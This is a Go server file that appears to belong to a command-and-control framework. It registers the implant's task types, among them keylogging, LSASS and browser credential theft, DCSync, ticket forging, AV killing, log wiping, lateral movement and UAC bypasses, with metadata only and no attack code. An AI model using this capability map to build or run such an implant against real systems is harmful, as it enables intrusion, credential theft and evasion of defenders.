package server

import (
	"net/http"

	"github.com/forgec2/forgec2/pkg/protocol"
	"github.com/gin-gonic/gin"
)

// TaskTypeParam describes a single parameter for a task type.
type TaskTypeParam struct {
	Name        string `json:"name"`
	Type        string `json:"type"`
	Required    bool   `json:"required"`
	Description string `json:"description,omitempty"`
}

// TaskTypeInfo describes a task type registered on the server.
type TaskTypeInfo struct {
	Type          string          `json:"type"`
	Name          string          `json:"name"`
	Description   string          `json:"description,omitempty"`
	Category      string          `json:"category,omitempty"`
	RequiresShell bool            `json:"requires_shell,omitempty"`
	RequiresElev  bool            `json:"requires_elevation,omitempty"`
	Parameters    []TaskTypeParam `json:"parameters,omitempty"`
}

var registeredTaskTypes []TaskTypeInfo

func init() {
	registeredTaskTypes = []TaskTypeInfo{
		{Type: protocol.TaskTypeShell, Name: "Shell", Description: "Execute a shell command", Category: "execution", RequiresShell: true,
			Parameters: []TaskTypeParam{
				{Name: "command", Type: "string", Required: true, Description: "Command to execute"},
				{Name: "shell", Type: "string", Required: false, Description: "cmd.exe or powershell.exe"},
			}},
		{Type: protocol.TaskTypePS, Name: "Process List", Description: "List running processes", Category: "discovery"},
		{Type: protocol.TaskTypeProcessTree, Name: "Process Tree", Description: "Process list (alias of ps; not a true parent-child tree view)", Category: "discovery"},
		{Type: protocol.TaskTypeScreenshot, Name: "Screenshot", Description: "Capture screen", Category: "collection"},
		{Type: protocol.TaskTypeScreenshotWin, Name: "Window Screenshot", Description: "Capture a specific window", Category: "collection"},
		{Type: protocol.TaskTypeKeylogStart, Name: "Keylogger Start", Description: "Start keylogging", Category: "collection"},
		{Type: protocol.TaskTypeKeylogStop, Name: "Keylogger Stop", Description: "Stop keylogging", Category: "collection"},
		{Type: protocol.TaskTypeKeylogDump, Name: "Keylogger Dump", Description: "Dump captured keystrokes", Category: "collection"},
		{Type: protocol.TaskTypeSuspend, Name: "Suspend Process", Description: "Suspend a process by PID", Category: "execution",
			Parameters: []TaskTypeParam{{Name: "command", Type: "int", Required: true, Description: "PID to suspend"}}},
		{Type: protocol.TaskTypeResume, Name: "Resume Process", Description: "Resume a suspended process", Category: "execution",
			Parameters: []TaskTypeParam{{Name: "command", Type: "int", Required: true, Description: "PID to resume"}}},
		{Type: protocol.TaskTypeKillProc, Name: "Kill Process", Description: "Terminate a process by PID", Category: "execution",
			Parameters: []TaskTypeParam{{Name: "command", Type: "int", Required: true, Description: "PID to kill"}}},
		{Type: protocol.TaskTypeClipboardGet, Name: "Clipboard Get", Description: "Read clipboard contents", Category: "collection"},
		{Type: protocol.TaskTypeClipboardSet, Name: "Clipboard Set", Description: "Write to clipboard", Category: "collection",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Text to set"}}},
		{Type: protocol.TaskTypeFind, Name: "Find Files", Description: "Search for files matching a pattern", Category: "discovery",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Filename pattern"}}},
		{Type: protocol.TaskTypeRegGet, Name: "Registry Get", Description: "Read a registry value", Category: "discovery",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Registry path"}}},
		{Type: protocol.TaskTypeRegSet, Name: "Registry Set", Description: "Set a registry value", Category: "defense-evasion",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Registry path=value"}}},
		{Type: protocol.TaskTypeRegDelete, Name: "Registry Delete", Description: "Delete a registry key", Category: "defense-evasion",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Registry path"}}},
		{Type: protocol.TaskTypeReboot, Name: "Reboot", Description: "Reboot the system", Category: "impact"},
		{Type: protocol.TaskTypeShutdown, Name: "Shutdown", Description: "Shut down the system", Category: "impact"},
		{Type: protocol.TaskTypeDrives, Name: "List Drives", Description: "List available drives", Category: "discovery"},
		{Type: protocol.TaskTypeBeaconNow, Name: "Beacon Now", Description: "Force immediate beacon check-in", Category: "c2"},
		{Type: protocol.TaskTypeServices, Name: "List Services", Description: "List Windows services", Category: "discovery"},
		{Type: protocol.TaskTypePortscan, Name: "Port Scan", Description: "Scan TCP ports on a target", Category: "discovery",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Target and ports"}}},
		{Type: protocol.TaskTypeNetstat, Name: "Network Connections", Description: "Show active network connections", Category: "discovery"},
		{Type: protocol.TaskTypeUsers, Name: "List Users", Description: "List logged-in users", Category: "discovery"},
		{Type: protocol.TaskTypeAV, Name: "Anti-Virus Check", Description: "List installed AV products", Category: "discovery"},
		{Type: protocol.TaskTypeDownloadURL, Name: "Download URL", Description: "Download a file from a URL", Category: "execution",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "URL to download"}}},
		{Type: protocol.TaskTypeUninstall, Name: "Uninstall Agent", Description: "Self-uninstall the agent", Category: "c2"},
		{Type: protocol.TaskTypeSetSleep, Name: "Set Sleep", Description: "Change beacon sleep interval", Category: "c2",
			Parameters: []TaskTypeParam{{Name: "command", Type: "int", Required: true, Description: "Sleep in seconds"}}},
		{Type: protocol.TaskTypeCreds, Name: "Dump Credentials", Description: "Dump credentials from LSASS", Category: "credential-access"},
		{Type: protocol.TaskTypeInject, Name: "Shellcode Inject", Description: "Inject shellcode into a process", Category: "execution",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "PID"}}},
		{Type: protocol.TaskTypeInjectMethods, Name: "Injection Methods", Description: "List available injection methods", Category: "execution"},
		{Type: protocol.TaskTypeSpawn, Name: "Spawn", Description: "Spawn a new agent process", Category: "execution"},
		{Type: protocol.TaskTypeMigrate, Name: "Migrate", Description: "Copy the implant into a fresh process context and self-delete", Category: "defense-evasion",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: false, Description: "Destination path for the migrated copy"}}},
		{Type: protocol.TaskTypeShinject, Name: "Shellcode Inject (self)", Description: "Inject shellcode into self", Category: "execution"},
		{Type: protocol.TaskTypeShspawn, Name: "Shellcode Spawn", Description: "Spawn shellcode in new process", Category: "execution"},
		{Type: protocol.TaskTypeLateral, Name: "Lateral Movement", Description: "Move laterally to another host", Category: "lateral-movement",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Target and method"}}},
		{Type: protocol.TaskTypeLateralWMI, Name: "Lateral WMI", Description: "WMI lateral movement", Category: "lateral-movement"},
		{Type: protocol.TaskTypeLateralWinRM, Name: "Lateral WinRM", Description: "WinRM lateral movement", Category: "lateral-movement"},
		{Type: protocol.TaskTypeLateralPsexec, Name: "Lateral PsExec", Description: "PsExec lateral movement", Category: "lateral-movement"},
		{Type: protocol.TaskTypeLateralDCOM, Name: "Lateral DCOM", Description: "DCOM lateral movement", Category: "lateral-movement"},
		{Type: protocol.TaskTypeSocks, Name: "SOCKS Proxy", Description: "Start a SOCKS proxy through agent", Category: "c2",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Port and action"}}},
		{Type: protocol.TaskTypeKillAV, Name: "Kill AV", Description: "Attempt to kill antivirus processes", Category: "defense-evasion"},
		{Type: protocol.TaskTypeElevate, Name: "Elevate", Description: "Attempt privilege escalation", Category: "privilege-escalation",
			RequiresElev: true},
		{Type: protocol.TaskTypeBOF, Name: "BOF", Description: "Execute Beacon Object File", Category: "execution",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "BOF name and args"}}},
		{Type: protocol.TaskTypeElevatePN, Name: "PrintNightmare", Description: "Elevate via PrintNightmare", Category: "privilege-escalation"},
		{Type: protocol.TaskTypeExecAssembly, Name: "Execute Assembly", Description: "Execute .NET assembly in memory", Category: "execution",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Assembly name"}}},
		{Type: protocol.TaskTypeKerberoast, Name: "Kerberoast", Description: "Request TGS for SPN accounts", Category: "credential-access"},
		{Type: protocol.TaskTypeMimikatz, Name: "Mimikatz", Description: "Run Mimikatz commands", Category: "credential-access",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Mimikatz command"}}},
		{Type: protocol.TaskTypeDPAPIMasterKey, Name: "DPAPI MasterKey", Description: "Extract DPAPI master keys", Category: "credential-access"},
		{Type: protocol.TaskTypeDPAPIBlob, Name: "DPAPI Blob", Description: "Decrypt DPAPI blob", Category: "credential-access"},
		{Type: protocol.TaskTypeDPAPIBrowser, Name: "DPAPI Browser", Description: "Decrypt browser DPAPI data", Category: "credential-access"},
		{Type: protocol.TaskTypeLSABypass, Name: "LSA Bypass", Description: "Bypass LSA protection", Category: "defense-evasion"},
		{Type: protocol.TaskTypeADCSFind, Name: "ADCS Find", Description: "Enumerate ADCS certificate templates", Category: "discovery"},
		{Type: protocol.TaskTypeADCSRequest, Name: "ADCS Request", Description: "Request a certificate", Category: "credential-access"},
		{Type: protocol.TaskTypeShadowCreds, Name: "Shadow Credentials", Description: "Add shadow credentials to an account", Category: "credential-access"},
		{Type: protocol.TaskTypeLDAPUsers, Name: "LDAP Users", Description: "Query AD users via LDAP", Category: "discovery"},
		{Type: protocol.TaskTypeLDAPGroups, Name: "LDAP Groups", Description: "Query AD groups via LDAP", Category: "discovery"},
		{Type: protocol.TaskTypeLDAPComputers, Name: "LDAP Computers", Description: "Query AD computers via LDAP", Category: "discovery"},
		{Type: protocol.TaskTypeLDAPSPN, Name: "LDAP SPN", Description: "Query SPN records via LDAP", Category: "discovery"},
		{Type: protocol.TaskTypeLDAPACL, Name: "LDAP ACL", Description: "Query AD ACLs via LDAP", Category: "discovery"},
		{Type: protocol.TaskTypeLDAPQuery, Name: "LDAP Query", Description: "Run arbitrary LDAP query", Category: "discovery",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "LDAP filter"}}},
		{Type: protocol.TaskTypeLS, Name: "List Directory", Description: "List directory contents", Category: "discovery",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: false, Description: "Directory path"}}},
		{Type: protocol.TaskTypeDelete, Name: "Delete File", Description: "Delete a file or directory", Category: "impact",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "File path"}}},
		{Type: protocol.TaskTypeRead, Name: "Read File", Description: "Read a file from the agent", Category: "collection",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "File path"}}},
		{Type: protocol.TaskTypeDownload, Name: "Download File", Description: "Download a file from the agent", Category: "collection",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Remote path"}}},
		{Type: protocol.TaskTypeUpload, Name: "Upload File", Description: "Upload a file to the agent", Category: "execution",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Target path"}}},
		{Type: protocol.TaskTypeNet, Name: "Network Enum", Description: "Enumerate network resources", Category: "discovery",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Net command args"}}},
		{Type: protocol.TaskTypePowerpick, Name: "PowerPick", Description: "Run PowerShell without powershell.exe", Category: "execution",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "PowerShell command"}}},
		{Type: protocol.TaskTypePELoader, Name: "PE Loader", Description: "Load PE from memory", Category: "execution"},
		{Type: protocol.TaskTypeRPortFwdStart, Name: "Reverse Port Forward", Description: "Start reverse port forward", Category: "c2",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Port config"}}},
		{Type: protocol.TaskTypeRPortFwdStop, Name: "Reverse Port Forward Stop", Description: "Stop reverse port forward", Category: "c2",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Forward ID"}}},
		{Type: protocol.TaskTypeDCSync, Name: "DCSync", Description: "DCSync attack against a domain", Category: "credential-access",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Target user"}}},
		{Type: protocol.TaskTypeGoldenTicket, Name: "Golden Ticket", Description: "Forge a Golden Ticket", Category: "credential-access",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Ticket params"}}},
		{Type: protocol.TaskTypeSilverTicket, Name: "Silver Ticket", Description: "Forge a Silver Ticket", Category: "credential-access",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Ticket params"}}},
		{Type: protocol.TaskTypeASREPRoast, Name: "AS-REP Roast", Description: "Roast AS-REP responses", Category: "credential-access"},
		{Type: protocol.TaskTypePassTheHash, Name: "Pass the Hash", Description: "Pass-the-hash authentication", Category: "lateral-movement",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Hash and target"}}},
		{Type: protocol.TaskTypePassTheTicket, Name: "Pass the Ticket", Description: "Pass-the-ticket authentication", Category: "lateral-movement",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Ticket and target"}}},
		{Type: protocol.TaskTypePersistenceAdd, Name: "Persistence Add", Description: "Install persistence mechanism", Category: "persistence",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Persistence method"}}},
		{Type: protocol.TaskTypePersistenceList, Name: "Persistence List", Description: "List persistence mechanisms", Category: "persistence"},
		{Type: protocol.TaskTypePersistenceRem, Name: "Persistence Remove", Description: "Remove persistence mechanism", Category: "persistence",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Persistence ID"}}},
		{Type: protocol.TaskTypeBrowserSteal, Name: "Browser Steal", Description: "Steal browser passwords", Category: "credential-access"},
		{Type: protocol.TaskTypeCookieExport, Name: "Cookie Export", Description: "Export browser cookies", Category: "collection"},
		{Type: protocol.TaskTypeVPNCreds, Name: "VPN Credentials", Description: "Extract VPN credentials", Category: "credential-access"},
		{Type: protocol.TaskTypeWifiCreds, Name: "WiFi Credentials", Description: "Extract WiFi credentials", Category: "credential-access"},
		{Type: protocol.TaskTypePrivescCheck, Name: "PrivEsc Check", Description: "Check for privilege escalation vectors", Category: "privilege-escalation"},
		{Type: protocol.TaskTypeRemoteInput, Name: "Remote Input", Description: "Send mouse/keyboard input remotely", Category: "collection"},
		{Type: protocol.TaskTypeUACBypass, Name: "UAC Bypass", Description: "Bypass UAC", Category: "privilege-escalation"},
		{Type: protocol.TaskTypeAMSIByPass, Name: "AMSI Bypass", Description: "Bypass AMSI", Category: "defense-evasion"},
		{Type: protocol.TaskTypeETWByPass, Name: "ETW Bypass", Description: "Bypass ETW", Category: "defense-evasion"},
		{Type: protocol.TaskTypeAMSIHardwareBP, Name: "AMSI HW BP", Description: "AMSI bypass via HW breakpoints", Category: "defense-evasion"},
		{Type: protocol.TaskTypeETWHardwareBP, Name: "ETW HW BP", Description: "ETW bypass via HW breakpoints", Category: "defense-evasion"},
		{Type: protocol.TaskTypeBlockDLLs, Name: "Block DLLs", Description: "Block non-Microsoft DLLs", Category: "defense-evasion"},
		{Type: protocol.TaskTypeUnhookNtdll, Name: "Unhook NTDLL", Description: "Unhook ntdll.dll", Category: "defense-evasion"},
		{Type: protocol.TaskTypeProtectProcess, Name: "Protect Process", Description: "Protect process from termination", Category: "defense-evasion"},
		{Type: protocol.TaskTypeRunEvasion, Name: "Run Evasion", Description: "Run an evasion technique by name", Category: "defense-evasion",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Technique name (amsi, etw, blockdlls, veh, syscall, etc.)"}}},
		{Type: protocol.TaskTypeCleanup, Name: "Cleanup", Description: "Clean up artifacts", Category: "defense-evasion"},
		{Type: protocol.TaskTypeLogWipe, Name: "Log Wipe", Description: "Wipe event logs", Category: "defense-evasion"},
		{Type: protocol.TaskTypeTrackWipe, Name: "Track Wipe", Description: "Wipe tracking files", Category: "defense-evasion"},
		{Type: protocol.TaskTypeSelfDelete, Name: "Self Delete", Description: "Delete agent binary", Category: "defense-evasion"},
		{Type: protocol.TaskTypeKill, Name: "Kill Agent", Description: "Terminate the agent process", Category: "c2"},
		{Type: protocol.TaskTypeSelfUpdate, Name: "Self Update", Description: "Replace agent binary with new version", Category: "c2",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Download URL"}}},
		{Type: protocol.TaskTypeReflectDLLInject, Name: "Reflective DLL Inject", Description: "Inject reflective DLL into process", Category: "execution",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "PID"}}},
		{Type: protocol.TaskTypeCoercePrinterBug, Name: "Coerce Printer Bug", Description: "Coerce NTLM auth via MS-RPRN", Category: "credential-access"},
		{Type: protocol.TaskTypeCoercePetitPotam, Name: "Coerce PetitPotam", Description: "Coerce NTLM auth via EFSRPC", Category: "credential-access"},
		{Type: protocol.TaskTypeCoerceDFS, Name: "Coerce DFS", Description: "Coerce NTLM auth via DFS", Category: "credential-access"},
		{Type: protocol.TaskTypeRelayNTLMStart, Name: "NTLM Relay", Description: "Start NTLM relay listener", Category: "credential-access"},
		{Type: protocol.TaskTypeRelayNTLMStop, Name: "NTLM Relay Stop", Description: "Stop NTLM relay listener", Category: "credential-access"},
		{Type: protocol.TaskTypeNTLMHelp, Name: "NTLM Help", Description: "Show NTLM relay help", Category: "credential-access"},
		{Type: protocol.TaskTypeCertStoreList, Name: "Cert Store List", Description: "List certificate store contents", Category: "discovery"},
		{Type: protocol.TaskTypeCLRExecAssembly, Name: "CLR Exec Assembly", Description: "Execute .NET assembly via CLR", Category: "execution"},
		{Type: protocol.TaskTypeCLRPowerShell, Name: "CLR PowerShell", Description: "Run PowerShell via CLR", Category: "execution"},
		{Type: protocol.TaskTypeRunEgress, Name: "Egress Check", Description: "Test egress connectivity", Category: "discovery"},
		{Type: protocol.TaskTypeSharpHound, Name: "SharpHound", Description: "Run SharpHound for BloodHound", Category: "discovery"},
		{Type: protocol.TaskTypeSetC2Mode, Name: "Set C2 Mode", Description: "Switch between C2 modes", Category: "c2"},
		{Type: protocol.TaskTypeInteractiveShellStart, Name: "Interactive Shell", Description: "Start interactive shell session", Category: "execution"},
		{Type: protocol.TaskTypeInteractiveShellWrite, Name: "Interactive Shell Write", Description: "Send input to interactive shell", Category: "execution"},
		{Type: protocol.TaskTypeInteractiveShellStop, Name: "Interactive Shell Stop", Description: "Stop interactive shell session", Category: "execution"},
		{Type: protocol.TaskTypeTunnelAddRoute, Name: "Tunnel Add Route", Description: "Add tunnel route", Category: "c2"},
		{Type: protocol.TaskTypeTunnelRemoveRoute, Name: "Tunnel Remove Route", Description: "Remove tunnel route", Category: "c2"},
		{Type: protocol.TaskTypeGossipDiscover, Name: "P2P Discover", Description: "Discover peer agents", Category: "c2"},
		{Type: protocol.TaskTypeChromeC2, Name: "Chrome C2", Description: "[Experimental/extension-only] Chrome C2 mode — not handled by standard Go implant", Category: "c2"},
		{Type: protocol.TaskTypeChromeExec, Name: "Chrome Exec", Description: "[Experimental/extension-only] Execute via Chrome extension agent", Category: "execution"},
		{Type: protocol.TaskTypeChromeScript, Name: "Chrome Script", Description: "[Experimental/extension-only] Run JS via Chrome extension agent", Category: "execution"},
		{Type: protocol.TaskTypeChromeCookies, Name: "Chrome Cookies", Description: "[Experimental/extension-only] Steal Chrome cookies via extension", Category: "credential-access"},
		{Type: protocol.TaskTypeChromeHistory, Name: "Chrome History", Description: "[Experimental/extension-only] Steal Chrome history via extension", Category: "collection"},
		{Type: protocol.TaskTypeChromeTabs, Name: "Chrome Tabs", Description: "[Experimental/extension-only] List Chrome tabs via extension", Category: "collection"},
		{Type: protocol.TaskTypeChromeDownload, Name: "Chrome Downloads", Description: "[Experimental/extension-only] Chrome download history via extension", Category: "collection"},
		{Type: protocol.TaskTypeChromeScreenshot, Name: "Chrome Screenshot", Description: "[Experimental/extension-only] Screenshot Chrome page via extension", Category: "collection"},
		{Type: protocol.TaskTypeChromeClipboard, Name: "Chrome Clipboard", Description: "[Experimental/extension-only] Read Chrome clipboard via extension", Category: "collection"},
		{Type: protocol.TaskTypeChromeIdle, Name: "Chrome Idle", Description: "[Experimental/extension-only] Check Chrome idle via extension", Category: "discovery"},
		{Type: protocol.TaskTypeContainerDetect, Name: "Container Detect", Description: "Detect container environment", Category: "discovery"},
		{Type: protocol.TaskTypeContainerEscape, Name: "Container Escape", Description: "Attempt container escape", Category: "privilege-escalation"},
		{Type: protocol.TaskTypeContainerDocker, Name: "Container Docker", Description: "Docker container operations", Category: "execution"},
		{Type: protocol.TaskTypeContainerK8s, Name: "Container K8s", Description: "Kubernetes container operations", Category: "execution"},
		{Type: protocol.TaskTypeSetSleepMask, Name: "Set Sleep Mask", Description: "Set sleep mask", Category: "defense-evasion"},
		{Type: protocol.TaskTypeSetSleepMaskAdvanced, Name: "Set Sleep Mask Advanced", Description: "Set advanced sleep mask", Category: "defense-evasion"},
		{Type: protocol.TaskTypeSandboxDetect, Name: "Sandbox Detect", Description: "Detect sandbox environment", Category: "defense-evasion"},
		{Type: protocol.TaskTypeSandboxDetectAdvanced, Name: "Sandbox Detect Advanced", Description: "Advanced sandbox detection", Category: "defense-evasion"},
		{Type: protocol.TaskTypeSetWorkingHours, Name: "Set Working Hours", Description: "Set agent working hours", Category: "c2"},
		{Type: protocol.TaskTypeSetKillDate, Name: "Set Kill Date", Description: "Set agent expiry date", Category: "c2"},
		{Type: protocol.TaskTypeClearKillDate, Name: "Clear Kill Date", Description: "Clear agent expiry date", Category: "c2"},
		{Type: protocol.TaskTypeBOFInfection, Name: "BOF Infection", Description: "Download and execute BOF from server", Category: "execution"},
		{Type: protocol.TaskTypeEvasionKernelCallback, Name: "Kernel Callback", Description: "Kernel callback evasion", Category: "defense-evasion"},
		{Type: protocol.TaskTypeEvasionETWTI, Name: "ETW TI", Description: "ETW threat intel evasion", Category: "defense-evasion"},
		{Type: protocol.TaskTypeEvasionEnumCallbacks, Name: "Enum Callbacks", Description: "Enumerate kernel callbacks", Category: "defense-evasion"},
		{Type: protocol.TaskTypeEvasionObjCB, Name: "ObjCB Evasion", Description: "Object callback evasion", Category: "defense-evasion"},
		{Type: protocol.TaskTypeEvasionImgLoad, Name: "Image Load Evasion", Description: "Image load callback evasion", Category: "defense-evasion"},
		{Type: protocol.TaskTypeFindDelegation, Name: "Find Delegation", Description: "Find Kerberos delegation", Category: "discovery"},
		{Type: protocol.TaskTypeConstrainedDeleg, Name: "Constrained Delegation", Description: "Exploit constrained delegation", Category: "credential-access"},
		{Type: protocol.TaskTypeRBCD, Name: "RBCD", Description: "Resource-based constrained delegation", Category: "credential-access"},
		{Type: protocol.TaskTypeBronzeBit, Name: "Bronze Bit", Description: "Bronze Bit attack", Category: "credential-access"},
		{Type: protocol.TaskTypeAdminSDHolder, Name: "AdminSDHolder", Description: "AdminSDHolder operations", Category: "persistence"},
		{Type: protocol.TaskTypeDCSyncMachine, Name: "DCSync Machine", Description: "DCSync machine account", Category: "credential-access"},
		{Type: protocol.TaskTypeTokenListProcs, Name: "Token List Procs", Description: "List processes for token theft", Category: "privilege-escalation"},
		{Type: protocol.TaskTypeTokenSteal, Name: "Token Steal", Description: "Steal access token from process", Category: "privilege-escalation",
			Parameters: []TaskTypeParam{{Name: "command", Type: "int", Required: true, Description: "PID to steal from"}}},
		{Type: protocol.TaskTypeTokenMake, Name: "Token Make", Description: "Create access token for user", Category: "privilege-escalation",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "Username"}}},
		{Type: protocol.TaskTypeTokenRevert, Name: "Token Revert", Description: "Revert to original token", Category: "privilege-escalation"},
		{Type: protocol.TaskTypeTokenWhoami, Name: "Token Whoami", Description: "Show current token identity", Category: "discovery"},
		{Type: protocol.TaskTypeNamedPipeImp, Name: "Named Pipe Impersonation", Description: "Impersonate via named pipe", Category: "privilege-escalation"},
		{Type: protocol.TaskTypeJuicyPotato, Name: "Juicy Potato", Description: "Juicy Potato privilege escalation", Category: "privilege-escalation"},
		{Type: protocol.TaskTypeFodhelper, Name: "Fodhelper", Description: "Fodhelper UAC bypass", Category: "privilege-escalation"},
		{Type: protocol.TaskTypeSlui, Name: "Slui UAC", Description: "Slui UAC bypass", Category: "privilege-escalation"},
		{Type: protocol.TaskTypeEventvwr, Name: "EventVwr UAC", Description: "Event Viewer UAC bypass", Category: "privilege-escalation"},
		{Type: protocol.TaskTypeComputerDefaults, Name: "ComputerDefaults UAC", Description: "ComputerDefaults UAC bypass", Category: "privilege-escalation"},
		{Type: protocol.TaskTypeSSHLateral, Name: "SSH Lateral", Description: "SSH lateral movement", Category: "lateral-movement",
			Parameters: []TaskTypeParam{{Name: "command", Type: "string", Required: true, Description: "SSH target"}}},
		{Type: protocol.TaskTypeSSHKeygen, Name: "SSH Keygen", Description: "Generate SSH key pair", Category: "lateral-movement"},
		{Type: protocol.TaskTypeSSHTunnel, Name: "SSH Tunnel", Description: "Create SSH tunnel", Category: "c2"},
		{Type: protocol.TaskTypeSCPUpload, Name: "SCP Upload", Description: "Upload file via SCP", Category: "execution"},
		{Type: protocol.TaskTypeCloudSteal, Name: "Cloud Token Theft", Description: "Steal cloud access tokens", Category: "credential-access"},
		{Type: protocol.TaskTypeADCSESC1, Name: "ADCS ESC1", Description: "ADCS ESC1 attack", Category: "credential-access"},
		{Type: protocol.TaskTypeADCSESC2, Name: "ADCS ESC2", Description: "ADCS ESC2 attack", Category: "credential-access"},
		{Type: protocol.TaskTypeADCSESC3, Name: "ADCS ESC3", Description: "ADCS ESC3 attack", Category: "credential-access"},
		{Type: protocol.TaskTypeADCSESC4, Name: "ADCS ESC4", Description: "ADCS ESC4 attack", Category: "credential-access"},
		{Type: protocol.TaskTypeADCSESC5, Name: "ADCS ESC5", Description: "ADCS ESC5 attack", Category: "credential-access"},
		{Type: protocol.TaskTypeADCSESC6, Name: "ADCS ESC6", Description: "ADCS ESC6 attack", Category: "credential-access"},
		{Type: protocol.TaskTypeADCSESC7, Name: "ADCS ESC7", Description: "ADCS ESC7 attack", Category: "credential-access"},
		{Type: protocol.TaskTypeADCSESC8, Name: "ADCS ESC8", Description: "ADCS ESC8 attack", Category: "credential-access"},
		{Type: protocol.TaskTypeADCSFullAudit, Name: "ADCS Audit", Description: "Full ADCS audit", Category: "discovery"},
		{Type: protocol.TaskTypeSetSleepMode, Name: "Set Sleep Mode", Description: "Change sleep variation mode", Category: "c2"},
		{Type: protocol.TaskTypeGetSleepMode, Name: "Get Sleep Mode", Description: "Show current sleep mode", Category: "c2"},
		{Type: protocol.TaskTypeProfileRotate, Name: "Profile Rotate", Description: "Rotate communication profile", Category: "c2"},
		{Type: protocol.TaskTypeConfigPush, Name: "Config Push", Description: "Push configuration to agent", Category: "c2"},
		{Type: protocol.TaskTypeEdrStatus, Name: "EDR Status", Description: "Check EDR status", Category: "discovery"},
		{Type: protocol.TaskTypeGhostModeStatus, Name: "Ghost Mode Status", Description: "Check ghost mode status", Category: "c2"},
		{Type: protocol.TaskTypeGhostModeExit, Name: "Ghost Mode Exit", Description: "Exit ghost mode", Category: "c2"},
	}
}

// GetRegisteredTaskTypes returns a copy of the registered task type list.
func GetRegisteredTaskTypes() []TaskTypeInfo {
	out := make([]TaskTypeInfo, len(registeredTaskTypes))
	copy(out, registeredTaskTypes)
	return out
}

// IsKnownTaskType returns true if the type exists in the registry or is
// a known internal/plugin type that bypasses normal validation.
func IsKnownTaskType(t string) bool {
	for _, info := range registeredTaskTypes {
		if info.Type == t {
			return true
		}
	}
	return false
}

// getTaskTypeInfo returns the TaskTypeInfo for a given type string.
// Returns the info and true if found, zero value and false otherwise.
func getTaskTypeInfo(t string) (TaskTypeInfo, bool) {
	for _, info := range registeredTaskTypes {
		if info.Type == t {
			return info, true
		}
	}
	return TaskTypeInfo{}, false
}

// apiListTaskTypes returns the full task type registry for frontend consumption.
func (s *Server) apiListTaskTypes(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"success": true, "data": GetRegisteredTaskTypes()})
}
